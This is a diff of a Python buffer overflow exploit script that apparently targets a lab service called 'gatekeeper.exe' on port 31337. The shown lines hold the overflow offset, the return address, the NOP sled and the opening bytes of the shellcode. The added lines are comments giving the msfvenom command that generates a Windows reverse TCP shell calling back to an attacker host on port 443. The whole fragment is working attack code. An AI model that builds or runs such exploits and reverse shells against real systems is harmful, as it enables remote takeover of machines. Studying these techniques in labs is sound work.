@@ -613,6 +613,8 @@ port = 31337 # The gatekeeper.exe listening port
 offset = 146
 payload = b'A' * offset + b'\xC3\x14\x04\x08'
 nop = b'\x90' * 32
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.183.141 LPORT=443 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a'
 shellcode =  b""
 shellcode += b"\xba\x7d\x49\x17\x10\xdb\xd8\xd9\x74\x24\xf4"
 shellcode += b"\x58\x29\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04"
@@ -732,6 +734,8 @@ port = 31337 # The gatekeeper.exe listening port
 offset = 146
 payload = b'A' * offset + b'\xC3\x14\x04\x08'
 nop = b'\x90' * 32
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a'
 shellcode =  b""
 shellcode += b"\xda\xd9\xd9\x74\x24\xf4\x5f\xb8\x8c\xa4\x6e"
 shellcode += b"\x15\x31\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc"
